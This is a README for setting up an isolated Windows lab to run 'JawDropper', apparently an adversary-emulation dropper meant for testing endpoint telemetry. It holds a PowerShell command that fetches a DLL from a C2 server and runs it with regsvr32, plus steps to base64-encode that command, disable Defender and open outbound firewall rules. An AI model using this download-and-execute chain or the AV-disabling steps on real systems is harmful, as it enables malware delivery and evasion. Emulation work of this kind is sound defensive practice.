# JawDropper Lab Setup

```
============================================================================
ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY

Lab environment configuration for testing JawDropper safely.
Only run in isolated environments you control.
============================================================================
```

## Overview

This directory contains scripts and instructions for setting up an isolated Windows VM to test JawDropper. Proper lab setup ensures:

1. No risk to production systems
2. Easy cleanup via snapshots
3. Network isolation from real infrastructure
4. Ability to observe all telemetry

## Requirements

### Development Machine (macOS/Linux)
- Python 3.x for C2 server
- mingw-w64 for DLL compilation
- Network access to test VM

### Test VM (Windows)
- Windows 10/11 or Windows Server
- Network access to development machine (192.168.0.148)
- Endpoint telemetry tool (optional but recommended)

### Network
- Development machine IP: 192.168.0.148 (or update hardcoded IPs)
- Test VM on same subnet
- No internet access required

## VM Setup Options

### Option 1: Proxmox/VMware/VirtualBox

1. **Create Windows VM**
   - Install Windows 10/11 Pro
   - Allocate 4GB RAM, 40GB disk minimum
   - Configure network adapter for host-only or bridged

2. **Take initial snapshot**
   ```
   Snapshot name: "Clean-Install"
   ```

3. **Configure VM network**
   - Assign static IP on same subnet as dev machine
   - Verify connectivity: `ping 192.168.0.148`

4. **Install telemetry tools (optional)**
   - Sysmon
   - Your EDR agent
   - Process Monitor

5. **Take pre-test snapshot**
   ```
   Snapshot name: "Ready-For-Testing"
   ```

### Option 2: Windows Sandbox

Windows Sandbox provides a quick, disposable environment:

1. Enable Windows Sandbox feature
2. Create a `.wsb` configuration file:

```xml
<Configuration>
  <Networking>Enable</Networking>
  <MappedFolders>
    <MappedFolder>
      <HostFolder>C:\JawDropper</HostFolder>
      <ReadOnly>true</ReadOnly>
    </MappedFolder>
  </MappedFolders>
</Configuration>
```

3. Copy dropper.js to C:\JawDropper on host
4. Launch sandbox and run from mapped folder

**Limitation:** Sandbox is destroyed on close — no persistent telemetry.

## Network Configuration

### If your dev machine IP differs from 192.168.0.148:

You'll need to update the hardcoded IP in:
1. `stage1-dropper/dropper.js` — the encoded PowerShell command
2. `stage2-loader/loader.c` — the C2_HOST define

Then rebuild the components.

**To re-encode the PowerShell command:**

```powershell
$cmd = @'
$c2 = "http://YOUR.IP.HERE:8888"
$outPath = "$env:TEMP\update.dll"
Invoke-WebRequest -Uri "$c2/payloads/payload.dll" -OutFile $outPath
Start-Process "regsvr32.exe" -ArgumentList "/s $outPath"
'@

[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```

## Pre-Test Checklist

Before running JawDropper:

- [ ] VM snapshot taken
- [ ] C2 server running: `python3 -m http.server 8888`
- [ ] DLL built and in payloads directory
- [ ] Network connectivity verified: `Invoke-WebRequest http://192.168.0.148:8888/`
- [ ] Telemetry collection active (if using)
- [ ] AV disabled or exclusions configured (see below)

## Disabling Defender

For clean execution without AV interference, use `disable-defender.ps1`:

```powershell
# Run as Administrator on the test VM
Set-Location C:\path\to\lab-setup
.\disable-defender.ps1
```

This script:
1. Disables real-time protection
2. Disables behavior monitoring
3. Adds TEMP folder exclusion
4. Configures sample submission settings

**Note:** These changes revert on reboot. For persistent changes, use Group Policy.

## Firewall Configuration

Use `firewall-prep.ps1` to allow traffic to the C2 server:

```powershell
# Run as Administrator
.\firewall-prep.ps1
```

This creates outbound firewall rules allowing:
- HTTP to 192.168.0.148:8888

## Execution Procedure

1. **Start C2 server** (on dev machine):
   ```bash
   cd jawdropper
   python3 -m http.server 8888
   ```

2. **Copy dropper.js to VM**

3. **Open telemetry tools** (Process Monitor, EDR console, etc.)

4. **Execute**:
   - Double-click `dropper.js`
   - Or: `wscript.exe dropper.js`

5. **Observe**:
   - Process tree in Process Monitor
   - calc.exe should launch
   - Beacon in C2 server output

## Post-Test Cleanup

### Option A: Revert to snapshot (recommended)
```
Revert to: "Ready-For-Testing"
```

### Option B: Manual cleanup
```powershell
# Remove scheduled task
schtasks /delete /tn "JawDropper" /f

# Remove downloaded DLL
Remove-Item $env:TEMP\update.dll -ErrorAction SilentlyContinue

# Re-enable Defender
Set-MpPreference -DisableRealtimeMonitoring $false
```

## Troubleshooting

### DLL won't download

1. Check C2 server is running
2. Verify network connectivity: `ping 192.168.0.148`
3. Test HTTP: `Invoke-WebRequest http://192.168.0.148:8888/`
4. Check firewall rules

### Regsvr32 fails

1. Verify DLL was downloaded: `Test-Path $env:TEMP\update.dll`
2. Check DLL architecture (must be 64-bit)
3. Try direct execution: `regsvr32 /s $env:TEMP\update.dll`

### No beacon received

1. Check C2 server logs
2. Verify port 8888 is open
3. Check Windows Firewall outbound rules
4. Try curl from VM: `Invoke-WebRequest -Method POST http://192.168.0.148:8888/beacon`

### Defender blocks execution

1. Run `disable-defender.ps1` as Administrator
2. Add folder exclusion manually if needed
3. Consider using a VM without AV for cleaner testing

## Files in This Directory

| File | Description |
|------|-------------|
| `README.md` | This file |
| `firewall-prep.ps1` | Configure firewall for C2 access |
| `disable-defender.ps1` | Temporarily disable Windows Defender |
